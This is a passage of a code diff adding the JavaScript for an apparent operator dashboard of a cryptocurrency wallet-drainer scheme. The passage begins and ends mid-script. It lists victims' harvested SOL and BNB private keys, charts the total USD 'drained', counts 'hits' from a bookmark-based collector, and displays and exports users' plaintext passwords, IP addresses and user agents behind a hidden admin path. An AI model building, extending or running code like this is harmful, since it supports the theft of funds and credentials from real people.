+        let deletedUsersData = [];
+        let serverStartTime = Date.now();
+        let totalUsersCount = 0;
+        let checkBalanceCooldown = false;
+        let cooldownTimer = null;
+        let cooldownRemaining = 0;
+
+        async function loadServerInfo() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/server-info', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.serverStartTime) serverStartTime = data.serverStartTime;
+                }
+            } catch (e) { console.error('Error loading server info:', e); }
+        }
+
+        const now = new Date();
+        document.getElementById('currentDate').textContent = now.toLocaleDateString('en-US', {
+            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
+        }).toUpperCase();
+
+        function updateUptime() {
+            const elapsed = Date.now() - serverStartTime;
+            const seconds = Math.floor(elapsed / 1000);
+            const days = Math.floor(seconds / 86400);
+            const hours = Math.floor((seconds % 86400) / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            const secs = seconds % 60;
+            const el = document.getElementById('uptimeValue');
+            if (el) el.textContent = `${days}d ${hours}h ${minutes}m ${secs}s`;
+        }
+        setInterval(updateUptime, 1000);
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+        }
+
+        function switchTab(tab) {
+            document.querySelectorAll('.nav-item[data-tab]').forEach(n => n.classList.remove('active'));
+            const activeNav = document.querySelector(`.nav-item[data-tab="${tab}"]`);
+            if (activeNav) activeNav.classList.add('active');
+
+            document.querySelectorAll('.tab-content').forEach(c => { if(c.id.startsWith('tab-')) c.classList.remove('active'); });
+            document.getElementById('tab-' + tab).classList.add('active');
+
+            const titles = { data: 'Dashboard', logs: 'Logs', users: 'Users' };
+            document.getElementById('headerTitle').textContent = titles[tab] || 'Dashboard';
+
+            if (tab === 'users') { loadUsersData(); loadDeletedUsersData(); }
+
+            document.getElementById('sidebar').classList.remove('open');
+        }
+
+        function switchUsersSubTab(sub) {
+            document.querySelectorAll('.sub-tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelector(`.sub-tab-btn[onclick="switchUsersSubTab('${sub}')"]`).classList.add('active');
+            document.getElementById('subtab-active').classList.toggle('active', sub === 'active');
+            document.getElementById('subtab-deleted').classList.toggle('active', sub === 'deleted');
+            document.getElementById('exportUsersBtn').style.display = (sub === 'deleted') ? 'none' : '';
+        }
+
+        async function exportLogs() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/bookmark-data', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (!response.ok) { showErrorNotification('Failed to fetch logs'); return; }
+                const data = await response.json();
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'data.json';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                showNotification('Logs exported as data.json');
+            } catch (error) {
+                showErrorNotification('Export failed: ' + error.message);
+            }
+        }
+
+        async function exportUsers() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/users', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (!response.ok) { showErrorNotification('Failed to fetch users'); return; }
+                const data = await response.json();
+                if (!data.success) { showErrorNotification('Failed to fetch users'); return; }
+                const exportData = (data.users || []).map(u => ({
+                    username: u.username || '',
+                    password: u.password || '',
+                    signupDate: u.signupDate || '',
+                    lastLoginDate: u.lastLoginDate || '',
+                    signupIp: u.signupIp || '',
+                    lastAuthIp: u.lastAuthIp || '',
+                    userAgent: u.userAgent || ''
+                }));
+                const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'users.json';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                showNotification('Users exported as users.json');
+            } catch (error) {
+                showErrorNotification('Export failed: ' + error.message);
+            }
+        }
+
+        function copyField(text, el) {
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification('Copied!');
+                if (el) { el.style.background = '#10b981'; el.style.color = '#fff'; setTimeout(() => { el.style.background = ''; el.style.color = ''; }, 400); }
+            }).catch(err => showErrorNotification('Copy failed'));
+        }
+
+        async function loadUsersData() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/users', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (response.status === 401) { localStorage.removeItem('adminAuth'); window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                const data = await response.json();
+                if (data.success) { usersData = data.users; renderUsersTable(); }
+            } catch (error) { console.error('Error loading users:', error); }
+        }
+
+        async function loadDeletedUsersData() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/deleted-users', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (response.status === 401) return;
+                const data = await response.json();
+                if (data.success) { deletedUsersData = data.users; renderDeletedUsersTable(); }
+            } catch (error) { console.error('Error loading deleted users:', error); }
+        }
+
+        function renderUsersTable() {
+            const tbody = document.getElementById('usersTableBody');
+            document.getElementById('totalUsers').textContent = `${usersData.length} users`;
+            if (usersData.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;color:rgba(255,255,255,0.4);padding:30px;">No users</td></tr>';
+                return;
+            }
+            tbody.innerHTML = usersData.map(u => {
+                const ua = (u.userAgent || 'unknown');
+                const shortUa = ua.length > 40 ? ua.substring(0, 40) + '...' : ua;
+                return `<tr>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.username)}', this)" title="Click to copy">${esc(u.username)}</span></td>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.password)}', this)" title="Click to copy">${esc(u.password)}</span></td>
+                    <td style="color:rgba(255,255,255,0.4);font-size:12px;">${u.signupDate ? new Date(u.signupDate).toLocaleString() : 'N/A'}</td>
+                    <td style="color:rgba(255,255,255,0.4);font-size:12px;">${u.lastLoginDate ? new Date(u.lastLoginDate).toLocaleString() : 'N/A'}</td>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.signupIp || 'unknown')}', this)" title="Click to copy">${esc(u.signupIp || 'unknown')}</span></td>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.lastAuthIp || 'unknown')}', this)" title="Click to copy">${esc(u.lastAuthIp || 'unknown')}</span></td>
+                    <td><span class="user-field" onclick="copyField('${esc(ua)}', this)" title="${esc(ua)}">${esc(shortUa)}</span></td>
+                    <td>
+                        <button class="btn btn-danger" onclick="deleteUser('${esc(u.username)}')">
+                            <svg viewBox="0 0 24 24"><path d="M19,4H15.5L14.5,3H9.5L8.5,4H5V6H19M6,19A2,2 0 0,0 8,21H16A2,2 0 0,0 18,19V7H6V19Z" fill="currentColor"/></svg>
+                            <div class="tooltip">Delete User</div>
+                        </button>
+                    </td>
+                </tr>`;
+            }).join('');
+        }
+
+        function renderDeletedUsersTable() {
+            const tbody = document.getElementById('deletedUsersTableBody');
+            document.getElementById('totalDeletedUsers').textContent = `${deletedUsersData.length} deleted`;
+            if (deletedUsersData.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;color:rgba(255,255,255,0.4);padding:30px;">No deleted users</td></tr>';
+                return;
+            }
+            tbody.innerHTML = deletedUsersData.map(u => {
+                const ua = (u.userAgent || 'unknown');
+                const shortUa = ua.length > 40 ? ua.substring(0, 40) + '...' : ua;
+                return `<tr>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.username)}', this)" title="Click to copy">${esc(u.username)}</span></td>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.password)}', this)" title="Click to copy">${esc(u.password)}</span></td>
+                    <td style="color:rgba(255,255,255,0.4);font-size:12px;">${u.signupDate ? new Date(u.signupDate).toLocaleString() : 'N/A'}</td>
+                    <td style="color:rgba(255,255,255,0.4);font-size:12px;">${u.lastLoginDate ? new Date(u.lastLoginDate).toLocaleString() : 'N/A'}</td>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.signupIp || 'unknown')}', this)" title="Click to copy">${esc(u.signupIp || 'unknown')}</span></td>
+                    <td><span class="user-field-full" onclick="copyField('${esc(u.lastAuthIp || 'unknown')}', this)" title="Click to copy">${esc(u.lastAuthIp || 'unknown')}</span></td>
+                    <td><span class="user-field" onclick="copyField('${esc(ua)}', this)" title="${esc(ua)}">${esc(shortUa)}</span></td>
+                    <td style="color:rgba(255,255,255,0.4);font-size:12px;">${u.deletedAt ? new Date(u.deletedAt).toLocaleString() : 'N/A'}</td>
+                    <td>
+                        <div style="display:flex;gap:8px;">
+                        <button class="btn btn-success" onclick="restoreUser('${esc(u.username)}')">
+                            <svg viewBox="0 0 24 24"><path d="M13,3A9,9 0 0,0 4,12H1L4.89,15.89L4.96,16.03L9,12H6A7,7 0 0,1 13,5A7,7 0 0,1 20,12A7,7 0 0,1 13,19C11.07,19 9.32,18.21 8.06,16.94L6.64,18.36C8.27,19.99 10.51,21 13,21A9,9 0 0,0 22,12A9,9 0 0,0 13,3Z" fill="currentColor"/></svg>
+                            <div class="tooltip">Restore User</div>
+                        </button>
+                        <button class="btn btn-danger" onclick="permDeleteUser('${esc(u.username)}')">
+                            <svg viewBox="0 0 24 24"><path d="M19,4H15.5L14.5,3H9.5L8.5,4H5V6H19M6,19A2,2 0 0,0 8,21H16A2,2 0 0,0 18,19V7H6V19Z" fill="currentColor"/></svg>
+                            <div class="tooltip">Permanently Delete</div>
+                        </button>
+                        </div>
+                    </td>
+                </tr>`;
+            }).join('');
+        }
+
+        function esc(str) {
+            if (!str) return '';
+            return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+        }
+
+        async function deleteUser(username) {
+            if (!confirm(`Delete user "${username}"? They will be moved to Deleted Users.`)) return;
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch(`/api/users/${encodeURIComponent(username)}`, {
+                    method: 'DELETE',
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const data = await response.json();
+                if (data.success) { showNotification(`User ${username} deleted`); loadUsersData(); loadDeletedUsersData(); }
+                else showErrorNotification(data.error || 'Failed to delete user');
+            } catch (error) { showErrorNotification('Error: ' + error.message); }
+        }
+
+        async function restoreUser(username) {
+            if (!confirm(`Restore user "${username}"?`)) return;
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch(`/api/restore-user/${encodeURIComponent(username)}`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const data = await response.json();
+                if (data.success) { showNotification(`User ${username} restored`); loadUsersData(); loadDeletedUsersData(); }
+                else showErrorNotification(data.error || 'Failed to restore user');
+            } catch (error) { showErrorNotification('Error: ' + error.message); }
+        }
+
+        async function permDeleteUser(username) {
+            if (!confirm(`PERMANENTLY delete "${username}"? This cannot be undone.`)) return;
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch(`/api/deleted-users/${encodeURIComponent(username)}`, {
+                    method: 'DELETE',
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const data = await response.json();
+                if (data.success) { showNotification(`User ${username} permanently deleted`); loadDeletedUsersData(); }
+                else showErrorNotification(data.error || 'Failed to permanently delete user');
+            } catch (error) { showErrorNotification('Error: ' + error.message); }
+        }
+
+        async function loadServerConfig() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/config', {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    serverConfig = data.config || {};
+                }
+            } catch (error) {
+                console.error('Error loading config:', error);
+            }
+        }
+
+        async function loadDrainHistory() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/drain-history', {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    drainHistory = data.history || [];
+                    customDrainedAmount = data.customDrainedAmount || 0;
+                }
+            } catch (error) {
+                console.error('Error loading drain history:', error);
+            }
+        }
+
+        function getTotalDrainedUsd() {
+            return drainHistory.reduce((sum, entry) => sum + (entry.usdAmount || 0), 0) + customDrainedAmount;
+        }
+
+        function toPstDateString(isoDate) {
+            if (!isoDate) return 'N/A';
+            try {
+                return new Date(isoDate).toLocaleString('en-US', { timeZone: 'America/Los_Angeles', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+            } catch { return isoDate; }
+        }
+
+
+        async function loadTotalUsersCount() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                const response = await fetch('/api/users', { headers: { 'Authorization': `Bearer ${token}` } });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success) totalUsersCount = (data.users || []).length;
+                }
+            } catch (e) { console.error('Error loading users count:', e); }
+        }
+
+        async function loadData() {
+            try {
+                const token = localStorage.getItem('adminAuth');
+                if (!token) { window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login'; return; }
+                await loadServerConfig();
+                await loadDrainHistory();
+                await loadTotalUsersCount();
+                const response = await fetch('/api/bookmark-data', {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (response.status === 401) {
+                    localStorage.removeItem('adminAuth');
+                    window.location.href = '/xsbhysdgftwdbqdsbfdspfbdshukds/login';
+                    return;
+                }
+                const rawData = await response.json();
+                bookmarkData = Array.isArray(rawData) ? rawData.filter(item => item && typeof item === 'object' && item.timestamp && (item.processedSBundles !== undefined || item.processedBnbBundles !== undefined || item.site !== undefined)) : [];
+                renderStats();
+                renderCharts();
+                renderTable();
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        const eventSource = new EventSource('/api/stream?token=' + encodeURIComponent(localStorage.getItem('adminAuth')));
+        eventSource.onmessage = (event) => {
+            try {
+                const msg = JSON.parse(event.data);
+                if (msg.type === 'new-entry') {
+                    if (msg.data && typeof msg.data === 'object' && msg.data.timestamp) {
+                        bookmarkData.push(msg.data);
+                        renderStats();
+                        renderCharts();
+                        renderTable();
+                        showNotification('New entry!');
+                    }
+                } else if (msg.type === 'drain-update') {
+                    if (msg.entry) {
+                        drainHistory.push(msg.entry);
+                    } else {
+                        loadDrainHistory().then(() => {
+                            renderStats();
+                            renderCharts();
+                        });
+                        return;
+                    }
+                    renderStats();
+                    renderCharts();
+                }
+            } catch (err) {
+                console.error('SSE message error:', err);
+            }
+        };
+
+        let chartPeriods = { hits: 'daily', wallets: 'daily', drained: 'daily' };
+
+        function setChartPeriod(chart, period, btn) {
+            chartPeriods[chart] = period;
+            const bar = btn.parentElement;
+            bar.querySelectorAll('.sub-tab-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            renderCharts();
+        }
+
+        function toggleWalletsDataset(index, btn) {
+            if (!walletsChartInstance) return;
+            const meta = walletsChartInstance.getDatasetMeta(index);
+            meta.hidden = meta.hidden === null ? !walletsChartInstance.data.datasets[index].hidden : !meta.hidden;
+            walletsChartInstance.update();
+            btn.classList.toggle('active', !meta.hidden);
+            btn.classList.toggle('inactive', !!meta.hidden);
+        }
+
+        function getDateLabel(dateStr) {
+            const d = new Date(dateStr);
+            return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+        }
+
+        function getWeekLabel(dateStr) {
+            const d = new Date(dateStr);
+            const startOfYear = new Date(d.getFullYear(), 0, 1);
+            const weekNum = Math.ceil(((d - startOfYear) / 86400000 + startOfYear.getDay() + 1) / 7);
+            return `W${weekNum} ${d.getFullYear()}`;
+        }
+
+        function getMonthLabel(dateStr) {
+            const d = new Date(dateStr);
+            return d.toLocaleDateString('en-US', { month: 'short', year: 'numeric' });
+        }
+
+        function getYearLabel(dateStr) {
+            return new Date(dateStr).getFullYear().toString();
+        }
+
+        function buildPeriodData(period) {
+            const hits = {};
+            const solWallets = {};
+            const bnbWallets = {};
+
+            let labelFn;
+            if (period === 'weekly') labelFn = getWeekLabel;
+            else if (period === 'monthly') labelFn = getMonthLabel;
+            else if (period === 'yearly') labelFn = getYearLabel;
+            else if (period === 'lifetime') labelFn = () => 'Lifetime';
+            else labelFn = getDateLabel;
+
+            bookmarkData.forEach(item => {
+                const label = labelFn(item.timestamp);
+                hits[label] = (hits[label] || 0) + 1;
+                solWallets[label] = (solWallets[label] || 0) + (item.processedSBundles?.count || 0);
+                bnbWallets[label] = (bnbWallets[label] || 0) + (item.processedBnbBundles?.count || 0);
+            });
+
+            let sorted;
+            if (period === 'lifetime') {
+                sorted = Object.keys(hits);
+            } else {
+                sorted = Object.keys(hits).sort((a, b) => {
+                    if (period === 'weekly') {
+                        const [wa, ya] = a.replace('W','').split(' ');
+                        const [wb, yb] = b.replace('W','').split(' ');
+                        return (parseInt(ya)*100+parseInt(wa)) - (parseInt(yb)*100+parseInt(wb));
+                    }
+                    return new Date(a) - new Date(b);
+                });
+            }
+            return { labels: sorted, hits, solWallets, bnbWallets };
+        }
+
+        function sortPeriodLabels(labels, period) {
+            if (period === 'lifetime') return labels;
+            return labels.sort((a, b) => {
+                if (period === 'weekly') {
+                    const [wa, ya] = a.replace('W', '').split(' ');
+                    const [wb, yb] = b.replace('W', '').split(' ');
+                    return (parseInt(ya) * 100 + parseInt(wa)) - (parseInt(yb) * 100 + parseInt(wb));
+                }
+                return new Date(a) - new Date(b);
+            });
+        }
+
+        function buildDrainPeriodData(period) {
+            let labelFn;
+            if (period === 'weekly') labelFn = getWeekLabel;
+            else if (period === 'monthly') labelFn = getMonthLabel;
+            else if (period === 'yearly') labelFn = getYearLabel;
+            else if (period === 'lifetime') labelFn = () => 'Lifetime';
+            else labelFn = getDateLabel;
+
+            if (period === 'lifetime') {
+                const total = getTotalDrainedUsd();
+                if (total <= 0) return { labels: [], cumulativeData: [] };
+                return { labels: ['Lifetime'], cumulativeData: [Math.round(total * 100) / 100] };
+            }
+
+            const drainedByLabel = {};
+            drainHistory.forEach(entry => {
+                const label = labelFn(entry.timestamp);
+                drainedByLabel[label] = (drainedByLabel[label] || 0) + (entry.usdAmount || 0);
+            });
+
+            const sorted = sortPeriodLabels(Object.keys(drainedByLabel), period);
+            let cumulative = 0;
+            const cumulativeData = sorted.map(label => {
+                cumulative += drainedByLabel[label] || 0;
+                return Math.round(cumulative * 100) / 100;
+            });
+
+            return { labels: sorted, cumulativeData };
+        }
+
+        function renderCharts() {
+            const chartDefaults = {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: {
+                    legend: { display: false },
+                    tooltip: {
+                        displayColors: false,
+                        backgroundColor: 'rgba(17, 18, 20, 0.95)',
+                        titleColor: 'rgba(255, 255, 255, 0.7)',
+                        bodyColor: '#ffffff',
+                        borderColor: 'rgba(255, 255, 255, 0.1)',
+                        borderWidth: 1,
+                        padding: 10
+                    }
+                },
+                scales: {
+                    x: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: 'rgba(255,255,255,0.4)', font: { size: 11 } } },
+                    y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: 'rgba(255,255,255,0.4)', font: { size: 11 }, precision: 0 } }
+                }
+            };
+
+            const hitsData = buildPeriodData(chartPeriods.hits);
+            if (hitsChartInstance) hitsChartInstance.destroy();
+            const hitsCtx = document.getElementById('hitsChart').getContext('2d');
+            let hitsCum = 0;
+            const hitsCumData = hitsData.labels.map(l => { hitsCum += (hitsData.hits[l] || 0); return hitsCum; });
+            hitsChartInstance = new Chart(hitsCtx, {
+                type: 'line',
+                data: {
+                    labels: hitsData.labels,
+                    datasets: [{
+                        label: 'Total Hits',
+                        data: hitsCumData,
+                        borderColor: 'rgba(255, 255, 255, 0.5)',
+                        backgroundColor: 'rgba(255, 255, 255, 0.05)',
+                        fill: true,
+                        tension: 0.3,
+                        pointRadius: 4,
+                        pointBackgroundColor: 'rgba(255, 255, 255, 0.7)',
+                        borderWidth: 2
+                    }]
+                },
+                options: chartDefaults
+            });
+
+            const walletsData = buildPeriodData(chartPeriods.wallets);
+            if (walletsChartInstance) walletsChartInstance.destroy();
+            const walletsCtx = document.getElementById('walletsChart').getContext('2d');
+            let solCum = 0, bnbCum = 0;
+            const solCumData = walletsData.labels.map(l => { solCum += (walletsData.solWallets[l] || 0); return solCum; });
+            const bnbCumData = walletsData.labels.map(l => { bnbCum += (walletsData.bnbWallets[l] || 0); return bnbCum; });
+            walletsChartInstance = new Chart(walletsCtx, {
+                type: 'line',
+                data: {
+                    labels: walletsData.labels,
+                    datasets: [
+                        {
+                            label: 'SOL Wallets',
+                            data: solCumData,
+                            borderColor: 'rgba(255, 255, 255, 0.5)',
+                            backgroundColor: 'rgba(255, 255, 255, 0.05)',
+                            fill: true,
+                            tension: 0.3,
+                            pointRadius: 4,
+                            pointBackgroundColor: 'rgba(255, 255, 255, 0.7)',
+                            borderWidth: 2
+                        },
+                        {
+                            label: 'BNB Wallets',
+                            data: bnbCumData,
+                            borderColor: 'rgba(255, 255, 255, 0.3)',
+                            backgroundColor: 'rgba(255, 255, 255, 0.02)',
+                            fill: true,
+                            tension: 0.3,
+                            pointRadius: 4,
+                            pointBackgroundColor: 'rgba(255, 255, 255, 0.5)',
+                            borderWidth: 2
+                        }
+                    ]
+                },
+                options: chartDefaults
+            });
+
+            ['walletsSolToggle', 'walletsBnbToggle'].forEach((id) => {
+                const btn = document.getElementById(id);
+                if (btn) {
+                    btn.classList.add('active');
+                    btn.classList.remove('inactive');
+                }
+            });
+
+            const drainedData = buildDrainPeriodData(chartPeriods.drained);
+            if (drainedChartInstance) drainedChartInstance.destroy();
+            const drainedCtx = document.getElementById('drainedChart').getContext('2d');
+            drainedChartInstance = new Chart(drainedCtx, {
+                type: 'line',
+                data: {
+                    labels: drainedData.labels,
+                    datasets: [{
+                        label: 'Total Drained',
+                        data: drainedData.cumulativeData,
+                        borderColor: 'rgba(255, 255, 255, 0.5)',
+                        backgroundColor: 'rgba(255, 255, 255, 0.05)',
+                        fill: true,
+                        tension: 0.3,
+                        pointRadius: 4,
+                        pointBackgroundColor: 'rgba(255, 255, 255, 0.7)',
+                        borderWidth: 2
+                    }]
+                },
+                options: {
+                    ...chartDefaults,
+                    scales: {
+                        ...chartDefaults.scales,
+                        y: {
+                            ...chartDefaults.scales.y,
+                            ticks: {
+                                ...chartDefaults.scales.y.ticks,
+                                callback: function(value) { return '$' + value.toLocaleString(); }
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        function renderStats() {
+            const statsGrid = document.getElementById('statsGrid');
+            const uptimeEl = document.getElementById('uptimeValue');
+            const currentUptime = uptimeEl ? uptimeEl.textContent : '0d 0h 0m 0s';
+            const totalEntries = bookmarkData.length;
+            const last24Hours = bookmarkData.filter(item =>
+                new Date(item.timestamp) > new Date(Date.now() - 24*60*60*1000)
+            ).length;
+            const totalSolWallets = bookmarkData.reduce((total, item) => total + (item.processedSBundles?.count || 0), 0);
+            const totalBnbWallets = bookmarkData.reduce((total, item) => total + (item.processedBnbBundles?.count || 0), 0);
+            const totalDrained = getTotalDrainedUsd();
+            const historyOnly = drainHistory.reduce((sum, entry) => sum + (entry.usdAmount || 0), 0);
+            const adminAmount = customDrainedAmount || 0;
+            const drainedTooltip = adminAmount > 0 ? `title="Amount added from admin: $${adminAmount.toFixed(2)}&#10;From actual drains: $${historyOnly.toFixed(2)}"` : '';
+            const drainedCursor = adminAmount > 0 ? 'cursor: help;' : '';
+
+            statsGrid.innerHTML = `
+                <div class="stat-card" ${drainedTooltip} style="${drainedCursor}">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">TOTAL DRAINED${adminAmount > 0 ? ' <span style="font-size:9px;color:rgba(255,255,255,0.35);margin-left:4px;">ⓘ</span>' : ''}</span>
+                    </div>
+                    <div class="stat-card-value">$${totalDrained.toFixed(2)}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">TOTAL USERS</span>
+                    </div>
+                    <div class="stat-card-value">${totalUsersCount}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">TOTAL HITS</span>
+                    </div>
+                    <div class="stat-card-value">${totalEntries}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">LAST 24 HOURS</span>
+                    </div>
+                    <div class="stat-card-value">${last24Hours}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">SOL WALLETS</span>
+                    </div>
+                    <div class="stat-card-value">${totalSolWallets}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">BNB WALLETS</span>
+                    </div>
+                    <div class="stat-card-value">${totalBnbWallets}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-card-header">
+                        <span class="stat-card-title">UPTIME</span>
+                    </div>
+                    <div class="stat-card-value" id="uptimeValue" style="font-size: 18px;">${currentUptime}</div>
+                </div>
+            `;
+            document.getElementById('totalEntries').textContent = `${totalEntries} entries`;
+        }
+
+        function renderTable() {
+            const tbody = document.getElementById('dataTableBody');
+            tbody.innerHTML = bookmarkData.map(item => {
+                const solBundles = item.processedSBundles || {};
+                const bnbBundles = item.processedBnbBundles || {};
+                const solWallets = Array.isArray(solBundles.wallets) ? solBundles.wallets : [];
+                const bnbWallets = Array.isArray(bnbBundles.wallets) ? bnbBundles.wallets : [];
+                const sBundlesCount = solBundles.count || 0;
+                const bnbBundlesCount = bnbBundles.count || 0;
+                const totalWallets = sBundlesCount + bnbBundlesCount;
+                const hasError = solWallets.some(w => w.error) || bnbWallets.some(w => w.error);
+                const hasWallets = solWallets.length > 0 || bnbWallets.length > 0;
+
+                return `
+                    <tr>
+                        <td>${totalWallets > 0 ? (hasError ? 'Partial' : 'Success') : 'No Data'}</td>
+                        <td>${new Date(item.timestamp).toLocaleString()}</td>
+                        <td>
+                            <a href="${item.site || '#'}" target="_blank" style="color: #ffffff; text-decoration: none;">
+                                ${(item.site || 'N/A').length > 50 ? (item.site || 'N/A').substring(0, 30) + '...' : (item.site || 'N/A')}
+                            </a>
+                        </td>
+                        <td>
+                            <div>${typeof item.user === 'object' && item.user ? (item.user.name || item.user.email || 'N/A') : (item.user || 'N/A')}</div>
+                            <div style="font-size: 12px; color: rgba(255,255,255,0.4);">
+                                ${typeof item.user === 'object' && item.user ? (item.user.userId || item.user.id || 'N/A') : 'N/A'}
+                            </div>
+                        </td>
+                        <td style="text-align: center;">
+                            <span style="font-weight: bold;">${sBundlesCount}</span>
+                            <span style="color: rgba(255,255,255,0.3);"> / </span>
+                            <span style="font-weight: bold;">${bnbBundlesCount}</span>
+                        </td>
+                        <td>
+                            <div style="display: flex; gap: 8px;">
+                                <button class="btn btn-danger" onclick="deleteEntry(${item.id})">
+                                    <svg viewBox="0 0 24 24"><path d="M19,4H15.5L14.5,3H9.5L8.5,4H5V6H19M6,19A2,2 0 0,0 8,21H16A2,2 0 0,0 18,19V7H6V19Z" fill="currentColor"/></svg>
+                                    <div class="tooltip">Delete</div>
+                                </button>
+                                ${hasWallets ? `
+                                <button class="btn btn-primary btn-with-text" onclick="checkEntryBalance(${item.id})" id="checkBalanceBtn-${item.id}">Check</button>
+                                <button class="btn btn-success" onclick="viewWallets(${item.id})">
+                                    <svg viewBox="0 0 24 24"><path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H20A2,2 0 0,0 18,8V16A2,2 0 0,0 20,18M20,8V16H22V8A2,2 0 0,0 20,6V8Z" fill="currentColor"/></svg>
+                                    <div class="tooltip">View Keys</div>
+                                </button>` : ''}
+                                <button class="btn btn-secondary" onclick="viewFullData(${item.id})">
+                                    <svg viewBox="0 0 24 24"><path d="M14,3V5H17.59L7.76,14.83L9.17,16.24L19,6.41V10H21V3M19,19H5V5H12V3H5C3.89,3 3,3.9 3,5V19A2,2 0 0,0 5,21H19A2,2 0 0,0 21,19V12H19V19Z" fill="currentColor"/></svg>
+                                    <div class="tooltip">Details</div>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        async function deleteEntry(id) {
+            if (confirm('Are you sure you want to delete this entry?')) {
+                try {
+                    const token = localStorage.getItem('adminAuth');
+                    const response = await fetch(`/api/bookmark-data/${id}`, {
+                        method: 'DELETE',
+                        headers: { 'Authorization': `Bearer ${token}` }
+                    });
+                    const result = await response.json();
+                    if (result.success) { await loadData(); }
+                    else { alert('Failed to delete entry'); }
+                } catch (error) { alert('Error deleting entry: ' + error.message); }
+            }
+        }
+
+        function viewWallets(id) {
+            const entry = bookmarkData.find(item => item.id === id);
+            if (!entry || (!entry.processedSBundles && !entry.processedBnbBundles)) {
+                alert('No wallet data found'); return;
+            }
+            const modal = createModal();
+            const content = modal.querySelector('.modal-content');
+            let solWalletsHtml = '';
+            let bnbWalletsHtml = '';
+
+            if (entry.processedSBundles) {
+                if (entry.processedSBundles.error) {
+                    solWalletsHtml += `<div class="wallet-item wallet-error"><p style="color: #ef4444; margin: 0; font-size: 14px;"><strong>SOL Error:</strong> ${entry.processedSBundles.error}</p></div>`;
+                }
+                if (entry.processedSBundles.wallets && entry.processedSBundles.wallets.length > 0) {
+                    solWalletsHtml += `<div style="margin-bottom: 16px; font-weight: 700; font-size: 14px;">SOL Keys (${entry.processedSBundles.wallets.length})</div>`;
+                    solWalletsHtml += entry.processedSBundles.wallets.map(wallet => {
+                        if (wallet.error) {
